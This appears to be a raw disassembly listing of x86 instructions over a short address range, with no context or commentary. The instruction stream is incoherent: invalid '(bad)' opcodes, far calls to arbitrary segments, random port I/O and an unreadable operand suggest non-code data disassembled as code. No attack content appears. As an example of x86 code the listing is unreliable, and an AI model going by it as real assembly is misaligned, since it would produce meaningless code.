  42f515:	or     ebp,DWORD PTR [ecx+0x4d45bdb0]
  42f51b:	sub    DWORD PTR [esi+0x11],ecx
  42f51e:	call   0x1506:0xe6a7ddea
  42f525:	nop
  42f526:	pop    ecx
  42f527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f528:	jo     0x42f51c
  42f52a:	mov    dl,0x97
  42f52c:	sub    edx,DWORD PTR [edi+ebx*2]
  42f52f:	imul   esi,DWORD PTR [esi-0x530fb888],0x297c1b19
  42f539:	call   0x14b8f4a0
  42f53e:	mov    esi,0xf2451957
  42f543:	jne    0x42f537
  42f545:	sub    DWORD PTR [ebx-0x65208625],ebx
  42f54b:	aas    
  42f54c:	push   edi
  42f54d:	push   edx
  42f54e:	retf   0x24fc
  42f551:	(bad)  
  42f552:	mov    bl,0xa7
  42f554:	pop    esp
  42f555:	aas    
  42f556:	enter  0xeea5,0xc3
  42f55a:	ja     0x42f541
  42f55c:	mov    dl,0x1b
  42f55e:	out    dx,al
  42f55f:	inc    edi
  42f560:	sar    BYTE PTR [edx+0xb4d9efb],0xf3
  42f567:	xchg   DWORD PTR [ecx+0x19],esi
  42f56a:	addr16 je 0x42f553
  42f56d:	sub    bl,BYTE PTR [edx+0xe918a39]
  42f573:	and    esi,DWORD PTR [ecx+edi*8]
  42f576:	mov    ch,0xa7
  42f578:	add    DWORD PTR [eax+0x1f],0xec3b1729
  42f57f:	pop    ebp
  42f580:	mov    dl,0x10
  42f582:	out    dx,eax
  42f583:	xchg   edi,ecx
  42f585:	div    dh
  42f587:	fwait
  42f588:	xor    eax,0xc6a7d878
  42f58d:	pop    esi
  42f58e:	ret    
  42f58f:	pop    esi
  42f590:	cmc    
  42f591:	out    0x5b,al
  42f593:	mov    edi,0x2eabebb2
  42f598:	ins    BYTE PTR es:[edi],dx
  42f599:	add    cl,BYTE PTR [ecx-0x6c]
  42f59c:	pop    esi
  42f59d:	or     BYTE PTR ds:0x8caa3321,dl
  42f5a3:	lds    esi,FWORD PTR [edx]
  42f5a5:	xor    ch,0xb5
  42f5a8:	mov    fs,WORD PTR [ebx+0x78a277e]
  42f5ae:	xchg   DWORD PTR [esi+ebp*4-0x2a],edx
  42f5b2:	frstor [edi-0x62f7495e]
  42f5b8:	in     al,dx
  42f5b9:	or     al,0x5d
  42f5bb:	sbb    BYTE PTR [ebx-0x11a9d288],dh
  42f5c1:	mov    eax,ds:0xa67ab812
  42f5c6:	inc    ebp
  42f5c7:	sar    DWORD PTR [edx+0x14],1
  42f5ca:	repnz dec edi
  42f5cc:	fisttp QWORD PTR [eax]
  42f5ce:	inc    edx
  42f5cf:	aam    0x19
  42f5d1:	or     BYTE PTR [edx+0x2bdcd4ff],bl
  42f5d7:	or     BYTE PTR [edx+eiz*4-0x7dea604a],dl
  42f5de:	sbb    ch,dh
  42f5e0:	jl     0x42f63a
  42f5e2:	sbb    DWORD PTR [ebx+0x3c],eax
  42f5e5:	scas   eax,DWORD PTR es:[edi]
  42f5e6:	jnp    0x42f647
  42f5e8:	je     0x42f5b2
  42f5ea:	call   0x8254:0xcb8146c2
  42f5f1:	mov    edx,0x562fa750
  42f5f6:	inc    ebp
  42f5f7:	retf   0xa476
  42f5fa:	mov    es,WORD PTR [edx+esi*4]
  42f5fd:	mov    eax,0xc2732e46
  42f602:	pop    edx
  42f603:	mov    ds:0x90ba0b62,al
  42f608:	ficom  DWORD PTR [edi-0x23f8f5c4]
  42f60e:	fwait
  42f60f:	int3   
  42f610:	jge    0x42f64b
  42f612:	popfw  
  42f614:	mov    cl,0x80
  42f616:	jb     0x42f665
  42f618:	int    0xb
  42f61a:	test   BYTE PTR [edx+0x48],0x3c
  42f61e:	out    dx,eax
  42f61f:	jp     0x42f5df
  42f621:	dec    ecx
  42f622:	call   0xcf77:0x8b1c1ae1
  42f629:	nop
  42f62a:	sbb    esp,DWORD PTR [edi-0x156aa6b9]
  42f630:	fnstenv [eax-0x69]
  42f633:	jbe    0x42f5e7
  42f635:	cld    
  42f636:	std    
  42f637:	popf   
  42f638:	dec    esi
  42f639:	inc    eax
  42f63a:	gs adc eax,0xcd0a141b
  42f640:	std    
  42f641:	dec    ebx
  42f642:	mov    ah,0xfb
  42f644:	jbe    0x42f6a9
  42f646:	push   ds
  42f647:	cld    
  42f648:	mov    dl,0x5e
  42f64a:	in     eax,0xac
  42f64c:	jp     0x42f66c
  42f64e:	sahf   
  42f64f:	aas    
  42f650:	cmc    
  42f651:	or     al,0xbd
  42f653:	loop   0x42f5ec
  42f655:	aaa    
  42f656:	cld    
  42f657:	adc    al,0x66
  42f659:	inc    edx
  42f65a:	or     dl,BYTE PTR [edi]
  42f65c:	in     eax,0xc7
  42f65e:	call   0x4561:0x319cafc3
  42f665:	sbb    BYTE PTR [edx-0x5a],0x78
  42f669:	int3   
  42f66a:	inc    edi
  42f66b:	mov    cl,0x31
  42f66d:	cdq    
  42f66e:	shl    DWORD PTR [edi+0xf],cl
  42f671:	test   DWORD PTR ds:[ecx+0x595a49a5],ebp
  42f678:	cmp    al,0x44
  42f67a:	xor    eax,0xfd049e30
  42f67f:	pop    eax
  42f680:	outs   dx,BYTE PTR ds:[esi]
  42f681:	enter  0xea1a,0xca
  42f685:	shl    BYTE PTR [eax],1
  42f687:	imul   esi,DWORD PTR [ebx+0x47bd157e],0xffffff97
  42f68e:	ret    0x42f9
  42f691:	mov    bh,0x18
  42f693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f694:	sbb    BYTE PTR [ecx-0x5cee5284],0xb2
  42f69b:	push   ecx
  42f69c:	mov    dl,0xe4
  42f69e:	out    0x37,al
  42f6a0:	pop    esi
  42f6a1:	inc    esp
  42f6a2:	out    0x8a,eax
  42f6a4:	dec    esp
  42f6a5:	pop    ss
  42f6a6:	shl    DWORD PTR cs:[ebp-0x3eea98f5],0x3e
  42f6ae:	mov    edx,0xffd2b2bd
  42f6b3:	pop    esp
  42f6b4:	addr16 xchg esp,eax
  42f6b6:	out    0x9e,eax
  42f6b8:	ficom  DWORD PTR ds:0xa07223d
  42f6be:	sub    BYTE PTR [eax+0xb],bl
  42f6c1:	xor    edi,ebx
  42f6c3:	(bad)  
  42f6c4:	fidiv  WORD PTR [ecx-0x61b52c66]
  42f6ca:	jne    0x42f70a
  42f6cc:	cmc    
  42f6cd:	sub    eax,0x8248a61f
  42f6d2:	and    dh,BYTE PTR [ebx-0x39]
  42f6d5:	mov    ah,al
  42f6d7:	pop    edi
  42f6d8:	cdq    
  42f6d9:	ret    
  42f6da:	xchg   ecx,eax
  42f6db:	push   edx
  42f6dc:	mov    eax,ds:0x1227f52e
  42f6e1:	jge    0x42f6dc
  42f6e3:	mov    BYTE PTR [ebx+0x21a76ee9],0x96
  42f6ea:	cmp    BYTE PTR [ebp-0x537180cd],dh
  42f6f0:	mov    dl,0x6f
  42f6f2:	loop   0x42f674
  42f6f4:	repz popf 
  42f6f6:	fwait
  42f6f7:	xchg   ecx,eax
  42f6f8:	inc    ecx
  42f6f9:	or     BYTE PTR [ebx+0x57],bh
  42f6fc:	cmp    cl,BYTE PTR [eax+0x2]
  42f6ff:	test   eax,0xbd967952
  42f704:	scas   al,BYTE PTR es:[edi]
  42f705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f706:	xchg   ecx,eax
  42f707:	sub    BYTE PTR [edx+0x69],dh
  42f70a:	mul    DWORD PTR [edx-0x5831b5e3]
  42f710:	fstp   QWORD PTR [edx-0x442a72de]
  42f716:	jmp    0x42f77e
  42f718:	mov    dl,0x0
  42f71a:	sbb    edx,DWORD PTR [eax]
  42f71c:	call   0x42941666
  42f721:	sub    eax,0xf41de83
  42f726:	scas   al,BYTE PTR es:[edi]
  42f727:	repnz pop esp
  42f729:	retf   
  42f72a:	push   ebp
  42f72b:	cmp    eax,0xf48d22bb
  42f730:	mov    ecx,0xdcba3454
  42f735:	dec    ebx
  42f736:	mov    ebx,0x3d010b3f
  42f73b:	push   eax
  42f73c:	mov    dl,0xa4
  42f73e:	lahf   
  42f73f:	sti    
  42f740:	pop    edx
  42f741:	dec    ecx
  42f742:	sub    DWORD PTR ds:0x45640adb,esp
  42f748:	jl     0x42f705
  42f74a:	xor    edi,DWORD PTR [ecx-0x697f2c80]
  42f750:	mov    dl,0xdb
  42f752:	inc    edx
  42f753:	and    al,0x0
  42f755:	inc    edi
  42f756:	aaa    
  42f757:	fs (bad) 
  42f759:	or     ebx,DWORD PTR [esi-0xe]
  42f75c:	mov    esp,0x8683d55d
  42f761:	js     0x42f7df
  42f763:	adc    DWORD PTR [edx-0x40bbd25d],esi
  42f769:	(bad)  
  42f76a:	dec    esi
  42f76b:	pop    ebp
  42f76c:	outs   dx,BYTE PTR ds:[esi]
  42f76d:	or     esi,DWORD PTR [esp+esi*1-0x4eb560f1]
  42f774:	pop    ecx
  42f775:	stc    
  42f776:	call   0xdd9d:0x388bc000
  42f77d:	dec    eax
  42f77e:	test   al,0xa7
  42f780:	(bad)  
  42f781:	mov    edx,0x693454b6
  42f786:	rol    DWORD PTR [edx+esi*4-0x5ed3d60a],0x84
  42f78e:	fbstp  TBYTE PTR [edi]
  42f790:	or     BYTE PTR [ebx],0x80
  42f793:	mov    al,ds:0x1e2e073
  42f798:	or     BYTE PTR [ebp-0x57dbc366],0xe
  42f79f:	jno    0x42f771
  42f7a1:	push   esp
  42f7a2:	loopne 0x42f74b
  42f7a4:	push   es
  42f7a5:	xchg   edx,eax
  42f7a6:	addr16 cs sub al,0xcd
  42f7aa:	fbstp  TBYTE PTR [esi-0x4e]
  42f7ad:	mov    cl,0xa7
  42f7af:	add    bh,bl
  42f7b1:	imul   ebx,DWORD PTR [edi-0x51],0x53
  42f7b5:	or     ebp,DWORD PTR [eax+0x53]
  42f7b8:	loopne 0x42f804
  42f7ba:	imul   edi,DWORD PTR [esi-0x7a],0x9c329ac7
  42f7c1:	xor    ebp,ecx
  42f7c3:	xor    eax,0xa7a2d8d4
  42f7c8:	inc    ebp
  42f7c9:	xor    DWORD PTR [bp+si+0x62],ebp
  42f7cd:	fsub   QWORD PTR [edx-0x55]
  42f7d0:	cli    
  42f7d1:	sbb    eax,0x53fa720
  42f7d6:	xor    eax,esi
  42f7d8:	repnz pop ss
  42f7da:	in     eax,0xa7
  42f7dc:	push   ds
  42f7dd:	jl     0x42f7b8
  42f7df:	dec    ebx
  42f7e0:	test   al,0x1f
  42f7e2:	aaa    
  42f7e3:	sbb    dh,BYTE PTR [edx+0x45516509]
  42f7e9:	cmp    eax,0xcc8542e
  42f7ee:	jl     0x42f833
  42f7f0:	in     eax,dx
  42f7f1:	fwait
  42f7f2:	cmp    al,0x37
  42f7f4:	xlat   BYTE PTR ds:[ebx]
  42f7f5:	enter  0x440f,0xb2
  42f7f9:	mov    cl,0xc4
  42f7fb:	nop
  42f7fc:	jnp    0x42f7ef
  42f7fe:	retf   
  42f7ff:	mov    dh,0xf8
  42f801:	or     edi,DWORD PTR [ebp+0x75]
  42f804:	cld    
  42f805:	jle    0x42f7fb
  42f807:	xchg   BYTE PTR [bp+di],bh
  42f80a:	call   0x7477:0x92f67e73
  42f811:	pop    ebp
  42f812:	shl    DWORD PTR [edi-0x494e6934],1
  42f818:	aaa    
  42f819:	xor    al,0x13
  42f81b:	adc    dh,BYTE PTR [edx-0x2f6028e7]
  42f821:	cli    
  42f822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f823:	test   ebp,edx
  42f825:	push   ss
  42f826:	add    eax,0x1a77723f
  42f82b:	adc    DWORD PTR [ecx],esp
  42f82d:	mov    dl,0x57
  42f82f:	mov    ebx,0xde9ada16
  42f834:	xor    DWORD PTR [ecx+0x3e17476],0xffffff83
  42f83b:	fcmovnbe st,st(0)
  42f83d:	or     edi,DWORD PTR [eax-0x7defbd2c]
  42f843:	fsub   DWORD PTR ds:0xbf739a5f
  42f849:	pop    ebp
  42f84a:	mov    cl,0x1c
  42f84c:	sub    esi,DWORD PTR [edi]
  42f84e:	lea    esp,[edi+0x59bfcf3e]
  42f854:	fcmovnbe st,st(5)
  42f856:	mov    eax,ds:0xfd88bdc7
  42f85b:	sub    eax,0x761a8c69
  42f860:	inc    edx
  42f861:	(bad)  
  42f862:	sbb    al,0x4e
  42f864:	add    eax,0xaa4ace0c
  42f869:	xor    esp,DWORD PTR [esi+0x4d86f767]
  42f86f:	sbb    eax,0x9c9895b2
  42f874:	int    0xa
  42f876:	clc    
  42f877:	inc    edx
  42f878:	sub    eax,0x554f2108
  42f87d:	push   ecx
  42f87e:	xor    eax,0x7c276264
  42f883:	sahf   
  42f884:	pushf  
  42f885:	aaa    
  42f886:	xlat   BYTE PTR ds:[ebx]
  42f887:	pop    ebp
  42f888:	mov    dl,0xa6
  42f88a:	xorps  xmm6,XMMWORD PTR [eax+0x52a71a4d]
  42f891:	cli    
  42f892:	cmp    bh,BYTE PTR [edi+0x48]
  42f895:	lock or eax,0xbec4b276
  42f89b:	lods   al,BYTE PTR ds:[esi]
  42f89c:	ror    al,1
  42f89e:	fist   WORD PTR [eax+ecx*1+0x21aec30b]
  42f8a5:	sub    al,0x7a
  42f8a7:	aas    
  42f8a8:	jecxz  0x42f87e
  42f8aa:	in     eax,0xc2
  42f8ac:	mov    cl,0xbb
  42f8ae:	dec    edi
  42f8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8b0:	je     0x42f8d7
  42f8b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8b3:	dec    edi
  42f8b4:	xor    esi,DWORD PTR [ebx]
  42f8b6:	add    BYTE PTR [edi],0x40
  42f8b9:	push   edx
  42f8ba:	ins    DWORD PTR es:[edi],dx
  42f8bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8bc:	imul   eax,DWORD PTR [edx-0x1ba7399f],0xe7114a4c
  42f8c6:	sahf   
  42f8c7:	fimul  WORD PTR [ebx-0x47d88e17]
  42f8cd:	ror    dl,cl
  42f8cf:	or     al,0x9d
  42f8d1:	pop    es
  42f8d2:	(bad)  
  42f8d3:	sahf   
  42f8d4:	test   DWORD PTR [edi-0x66],ebp
  42f8d7:	sar    BYTE PTR [ecx-0x1],1
  42f8da:	mov    al,0xb8
  42f8dc:	loope  0x42f925
  42f8de:	jl     0x42f8c0
  42f8e0:	mov    ebp,0x897832a1
  42f8e5:	sub    esi,DWORD PTR [edx-0x6e]
  42f8e8:	pop    ecx
  42f8e9:	dec    esi
  42f8ea:	sahf   
  42f8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8ec:	scas   eax,DWORD PTR es:[edi]
  42f8ed:	dec    ebx
  42f8ee:	jmp    0x4516:0x5b9f75bf
  42f8f5:	repz int3 
  42f8f7:	aaa    
  42f8f8:	mov    bl,0xd8
  42f8fa:	or     BYTE PTR [ecx+0x2a],0xd5
  42f8fe:	loop   0x42f8b6
  42f900:	push   edi
  42f901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f902:	dec    esi
  42f903:	ja     0x42f8d1
  42f905:	or     ebp,DWORD PTR [edi]
  42f907:	mov    ah,0x63
  42f909:	push   ss
  42f90a:	popa   
  42f90b:	sub    DWORD PTR [ecx-0x67],ebp
  42f90e:	call   0x13a:0x34f656d3
  42f915:	adc    BYTE PTR [edi-0x75390752],bl
  42f91b:	js     0x42f8ef
  42f91d:	stc    
  42f91e:	mov    al,ds:0xaa6fb24c
  42f923:	lods   al,BYTE PTR ds:[esi]
  42f924:	repnz sbb bl,BYTE PTR ds:0xb10b2537
  42f92b:	clc    
  42f92c:	jp     0x42f8cb
  42f92e:	add    eax,ebx
  42f930:	dec    edi
  42f931:	aad    0x9a
  42f933:	pop    ebp
  42f934:	stos   BYTE PTR es:[edi],al
  42f935:	aaa    
  42f936:	push   ebx
  42f937:	ins    BYTE PTR es:[edi],dx
  42f938:	leave  
  42f939:	sar    DWORD PTR [edi+eiz*4+0x5e9279b3],0x4d
  42f941:	cmp    BYTE PTR [esi-0x3d9a4da0],ch
  42f947:	das    
  42f948:	push   esp
  42f949:	retf   0xe0c5
  42f94c:	mov    ecx,0xa762e10b
  42f951:	xlat   BYTE PTR ds:[ebx]
  42f952:	fcmovb st,st(4)
  42f954:	add    eax,0x59bebe4e
  42f959:	call   FWORD PTR [edx+0x3e452a77]
  42f95f:	mov    esp,0x609c0b1a
  42f964:	inc    edi
  42f965:	lods   eax,DWORD PTR ds:[esi]
  42f966:	repz daa 
  42f968:	mov    bh,0xc8
  42f96a:	call   0xf3c6:0x6c17c14b
  42f971:	sbb    dl,BYTE PTR [eax+ebp*4]
  42f974:	int    0xb1
  42f976:	js     0x42f9d1
  42f978:	mov    dl,0x5c
  42f97a:	inc    ebp
  42f97b:	and    BYTE PTR [ebp-0x63],ah
  42f97e:	call   0xca9e:0x277cd762
  42f985:	xor    BYTE PTR [edi+eiz*4+0x4a],dh
  42f989:	es xchg edi,eax
  42f98b:	pushw  es
  42f98d:	adc    al,dh
  42f98f:	inc    eax
  42f990:	scas   eax,DWORD PTR es:[edi]
  42f991:	fs xchg bl,bh
  42f994:	ja     0x42f9da
  42f996:	out    dx,al
  42f997:	push   0x8cbda532
  42f99c:	ins    BYTE PTR es:[edi],dx
  42f99d:	or     ecx,eax
  42f99f:	mov    ah,0x59
  42f9a1:	je     0x42fa12
  42f9a3:	pop    esi
  42f9a4:	xlat   BYTE PTR ds:[ebx]
  42f9a5:	mov    edi,0xa78f019e
  42f9aa:	adc    edi,0x72
  42f9ad:	pushf  
  42f9ae:	mov    ch,0x1b
  42f9b0:	adc    cl,BYTE PTR [ebx]
  42f9b2:	sub    edi,DWORD PTR [edx+edi*1]
  42f9b5:	jae    0x42f980
  42f9b7:	cdq    
  42f9b8:	mov    bl,0x6b
  42f9ba:	call   0xa425:0xf4077f5d
  42f9c1:	fnstcw WORD PTR [ecx]
  42f9c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9c4:	out    0x5e,al
  42f9c6:	push   esp
  42f9c7:	out    0xf1,eax
  42f9c9:	jmp    edx
  42f9cb:	ds mov dl,0x2c
  42f9ce:	push   eax
  42f9cf:	ror    DWORD PTR [eax+0x2f673583],cl
  42f9d5:	or     ebx,edi
  42f9d7:	(bad)  
  42f9d8:	mov    edx,0x94a06b1c
  42f9de:	cdq    
  42f9df:	pop    ecx
  42f9e0:	dec    edi
  42f9e1:	push   ss
  42f9e2:	inc    esp
  42f9e3:	push   ss
  42f9e4:	into   
  42f9e5:	xchg   ebx,eax
  42f9e6:	or     DWORD PTR [ebp*8-0x2e2c7cf5],ecx
  42f9ed:	pop    edi
  42f9ee:	mov    edx,0xa01cc882
  42f9f3:	push   ds
  42f9f4:	mov    dh,0x8b
  42f9f6:	loop   0x42f9d3
  42f9f8:	(bad)  
  42f9f9:	lock or BYTE PTR [ebp+0x74],dh
  42f9fd:	or     ecx,DWORD PTR [edx+0x3e409e3e]
  42fa03:	sub    DWORD PTR [ebx],eax
  42fa05:	ficomp WORD PTR [ebx-0xf5e68bf]
  42fa0b:	repnz or al,0x4a
  42fa0e:	outs   dx,BYTE PTR ds:[esi]
  42fa0f:	js     0x42fa3c
  42fa11:	or     esi,DWORD PTR [edx-0x56]
  42fa14:	ins    BYTE PTR es:[edi],dx
  42fa15:	cmp    eax,0xaf4fec88
  42fa1a:	call   0xdfe5:0x6a3f54c5
  42fa21:	jns    0x42f9eb
  42fa23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa24:	scas   eax,DWORD PTR es:[edi]
  42fa25:	cmp    ebp,DWORD PTR [ebx+eiz*4+0x3a]
  42fa29:	cmp    DWORD PTR [ebx-0x24],edx
  42fa2c:	xchg   esp,eax
  42fa2d:	repz dec ebx
  42fa2f:	enter  0x6b55,0xe2
  42fa33:	out    0xac,al
  42fa35:	mov    ecx,0x937217d5
  42fa3a:	dec    eax
  42fa3b:	lods   eax,DWORD PTR ds:[esi]
  42fa3c:	loope  0x42fa84
  42fa3e:	pop    eax
  42fa3f:	aad    0x9d
  42fa41:	sub    eax,0xbe747cc
  42fa46:	clc    
  42fa47:	cmp    esp,DWORD PTR [esi]
  42fa49:	jge    0x42fa84
  42fa4b:	sub    DWORD PTR [edx+0x362c89c0],esi
  42fa51:	mov    esp,DWORD PTR [ebx]
  42fa53:	xchg   edx,eax
  42fa54:	(bad)  [ebx]
  42fa56:	mov    al,ds:0x6a0246d
  42fa5b:	pop    edx
  42fa5c:	shr    BYTE PTR [edi-0x13],cl
  42fa5f:	mov    ebx,0x3ff9c4b2
  42fa64:	jae    0x42f9ec
  42fa66:	inc    edx
  42fa67:	dec    esi
  42fa68:	setae  al
  42fa6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa6c:	ins    DWORD PTR es:[edi],dx
  42fa6d:	pushf  
  42fa6e:	scas   eax,DWORD PTR es:[edi]
  42fa6f:	daa    
  42fa70:	test   al,0x88
  42fa72:	mov    al,ds:0xe4818a3a
  42fa77:	daa    
  42fa78:	fnsave [esi-0x76]
  42fa7b:	sub    DWORD PTR ds:0x1947797d,ebx
  42fa81:	or     ebx,DWORD PTR [eax+0x1]
  42fa84:	maskmovq mm2,mm0
  42fa87:	test   eax,0xa69abdd6
  42fa8c:	mov    bh,0xcf
  42fa8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa8f:	fcmovnb st,st(1)
  42fa91:	in     al,dx
  42fa92:	cmp    ecx,edx
  42fa94:	fs or  ebx,edi
  42fa97:	mov    bh,0xc7
  42fa99:	jg     0x42fb00
  42fa9b:	rcr    DWORD PTR [edi+0x6eee9a64],1
  42faa1:	sub    dh,BYTE PTR [eax+0x35b6f8ca]
  42faa7:	aad    0x7e
  42faa9:	or     ebp,DWORD PTR [ebx]
  42faab:	fcomp  QWORD PTR [edi-0x63]
  42faae:	les    ebp,FWORD PTR ds:0x949a0407
  42fab4:	(bad)  
  42fab5:	dec    edi
  42fab6:	mov    BYTE PTR [ecx-0x584a477a],dh
  42fabc:	in     eax,dx
  42fabd:	jnp    0x42fa80
  42fabf:	jg     0x42fa8c
  42fac1:	(bad)  
  42fac3:	fnstsw WORD PTR [ecx+0x2e353eb0]
  42fac9:	mov    cl,BYTE PTR [esp+ebx*4]
  42facc:	(bad)  
  42facd:	std    
  42face:	inc    edx
  42facf:	fwait
  42fad0:	mov    esi,0x56a7c878
  42fad5:	inc    BYTE PTR [eax-0x21]
  42fad8:	out    0x3e,al
  42fada:	hlt    
  42fadb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fadc:	mov    BYTE PTR [ebp-0x1],dl
  42fadf:	mov    al,ds:0x882e3173
  42fae4:	xor    ch,BYTE PTR [ebx]
  42fae6:	das    
  42fae7:	imul   ebp,DWORD PTR [ebx+ecx*1-0x66740b49],0xfffffff2
  42faef:	shr    BYTE PTR [edi-0x31],0x9a
  42faf3:	add    eax,esi
  42faf5:	push   esp
  42faf6:	rol    BYTE PTR [edi+esi*4+0x79],0xfa
  42fafb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fafc:	push   ebx
  42fafd:	xor    BYTE PTR [esi+0x48],dl
  42fb00:	ror    DWORD PTR [ecx],1
  42fb02:	mov    cl,ah
  42fb04:	pop    edx
  42fb05:	add    BYTE PTR [edx+0x35563ac8],bl
  42fb0b:	jp     0x42fb85
  42fb0d:	retf   
  42fb0e:	popa   
  42fb0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb10:	jecxz  0x42faf5
  42fb12:	push   esp
  42fb13:	mov    bl,0x85
  42fb15:	sbb    eax,0x47b5dd49
  42fb1a:	adc    bl,BYTE PTR [ecx+0x7dba3bbd]
  42fb20:	push   edx
  42fb21:	leave  
  42fb22:	add    esp,DWORD PTR [edi-0x64695a52]
  42fb28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb29:	add    ebx,ebp
  42fb2b:	mov    ?,WORD PTR [ecx+ebp*1-0x14c46a31]
  42fb32:	and    eax,DWORD PTR [ecx+0x7d]
  42fb35:	xor    edi,0x28d32ba5
  42fb3b:	cwde   
  42fb3c:	jl     0x42fbbc
  42fb3e:	ins    DWORD PTR es:[edi],dx
  42fb3f:	out    0xf6,eax
  42fb41:	sahf   
  42fb42:	lods   al,BYTE PTR ds:[esi]
  42fb43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb44:	or     ebp,DWORD PTR [ebx-0x70]
  42fb47:	dec    ecx
  42fb48:	push   0x3b636439
  42fb4d:	push   ecx
  42fb4e:	lds    edi,FWORD PTR [esi+0x13]
  42fb51:	shr    BYTE PTR [edx+0x170b9204],cl
  42fb57:	jnp    0x42fafb
  42fb59:	loop   0x42fb65
  42fb5b:	fisub  WORD PTR [ebp-0x4d1e10a3]
  42fb61:	xor    eax,0xc82bd558
  42fb66:	hlt    
  42fb67:	cmp    dh,BYTE PTR [esi+0xb]
  42fb6a:	pop    esp
  42fb6b:	jp     0x42fbd6
  42fb6d:	retf   
  42fb6e:	(bad)  
  42fb6f:	adc    ah,BYTE PTR ds:0x4dce8640
  42fb75:	icebp  
  42fb76:	xchg   esp,eax
  42fb77:	sbb    DWORD PTR [edx],esi
  42fb79:	or     eax,edx
  42fb7b:	inc    edi
  42fb7c:	or     edx,DWORD PTR [ecx-0x20]
  42fb7f:	pop    edi
  42fb80:	ror    BYTE PTR [ecx],cl
  42fb82:	pop    esi
  42fb83:	loope  0x42fb8c
  42fb85:	aaa    
  42fb86:	int3   
  42fb87:	cmp    al,0xf2
  42fb89:	adc    BYTE PTR [ebp-0x5ae735d2],ch
  42fb8f:	test   BYTE PTR [eax-0x75],bh
  42fb92:	xor    cl,BYTE PTR [esi+0x5aee318d]
  42fb98:	dec    BYTE PTR [ebx]
  42fb9a:	or     DWORD PTR [esi],esp
  42fb9c:	and    eax,DWORD PTR [esi-0x7d]
  42fb9f:	outs   dx,BYTE PTR ds:[esi]
  42fba0:	sub    al,0xf8
  42fba2:	popf   
  42fba3:	mov    esp,DWORD PTR ds:0x20c8192
  42fba9:	jp     0x42fbc1
  42fbab:	das    
  42fbac:	jo     0x42fb69
  42fbae:	inc    ecx
  42fbaf:	or     DWORD PTR [ebx+ecx*4-0x372f45bf],0x10
  42fbb7:	xchg   ecx,eax
  42fbb8:	pop    ds
  42fbb9:	add    cl,BYTE PTR [edx]
  42fbbb:	mov    esp,0xd949c1b
  42fbc0:	rcl    DWORD PTR [esi-0x584d04fb],cl
  42fbc6:	mov    dl,0x79
  42fbc8:	fisttp QWORD PTR [ebp+edi*2+0x19fd4fa7]
  42fbcf:	pop    ebx
  42fbd0:	jp     0x42fb8a
  42fbd2:	push   eax
  42fbd3:	dec    eax
  42fbd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbd5:	sbb    DWORD PTR [edi-0x6fc5c1bf],ecx
  42fbdb:	sbb    DWORD PTR [ecx-0x24],edx
  42fbde:	jp     0x42fc0b
  42fbe0:	in     eax,0xb
  42fbe2:	out    0xe4,eax
  42fbe4:	sbb    edi,eax
  42fbe6:	sbb    ebx,DWORD PTR [edx-0x3e6bb9bd]
  42fbec:	mov    WORD PTR [edi-0x18038d0],ss
  42fbf2:	sbb    eax,0xbe0bce0f
  42fbf7:	xchg   ebp,eax
  42fbf8:	jmp    0x3555fde
  42fbfd:	cmp    BYTE PTR [eax-0x68],0xb2
  42fc01:	xchg   BYTE PTR [esi-0x208585a1],ch
  42fc07:	rcl    DWORD PTR [edi],cl
  42fc09:	or     edi,DWORD PTR [ecx-0x8ab891c]
  42fc0f:	out    0x56,al
  42fc11:	mov    ebx,DWORD PTR [ebx-0x7417c416]
  42fc17:	mov    WORD PTR [edi+0x44],cs
  42fc1a:	inc    esi
  42fc1b:	add    al,0x2f
  42fc1d:	or     ecx,DWORD PTR [ebx+0x4a]
  42fc20:	add    BYTE PTR [eax+0x3f],cl
  42fc23:	or     eax,0x2f9acacf
  42fc28:	add    dh,BYTE PTR [ecx-0x3a478467]
  42fc2e:	icebp  
  42fc2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc30:	mov    eax,ds:0x6c91d1de
  42fc35:	lahf   
  42fc36:	sub    edx,ebx
  42fc38:	mov    dl,0x91
  42fc3a:	repnz loop 0x42fc57
  42fc3d:	lods   eax,DWORD PTR ds:[esi]
  42fc3e:	jb     0x42fc2b
  42fc40:	nop
  42fc41:	or     al,0x71
  42fc43:	mov    ds:0xe883dda7,al
  42fc48:	mov    dl,0x3
  42fc4a:	out    dx,eax
  42fc4b:	pop    ecx
  42fc4c:	jle    0x42fc92
  42fc4e:	call   0x1287:0xfc1471fa
  42fc55:	jno    0x42fc36
  42fc57:	rol    DWORD PTR [ebx],cl
  42fc59:	or     esp,DWORD PTR [ebx-0x72e6e982]
  42fc5f:	test   al,0xfe
  42fc61:	sub    bl,BYTE PTR [edx-0x218bcbd1]
  42fc67:	mov    ah,BYTE PTR [edi]
  42fc69:	retf   
  42fc6a:	or     DWORD PTR [edi+0x4afac6cf],esp
  42fc70:	into   
  42fc71:	inc    ebx
  42fc72:	inc    ecx
  42fc73:	in     eax,dx
  42fc74:	mov    dl,0x45
  42fc76:	push   ss
  42fc77:	inc    edx
  42fc78:	mov    ds:0xbf53efa,al
  42fc7d:	or     ebp,edx
  42fc7f:	in     al,dx
  42fc80:	xchg   DWORD PTR [esi+0x1184999c],eax
  42fc86:	loope  0x42fca1
  42fc88:	mov    dl,0x21
  42fc8a:	into   
  42fc8b:	retf   
  42fc8c:	xchg   edi,eax
  42fc8d:	sar    BYTE PTR [eax],1
  42fc8f:	mov    esp,0x59c40c62
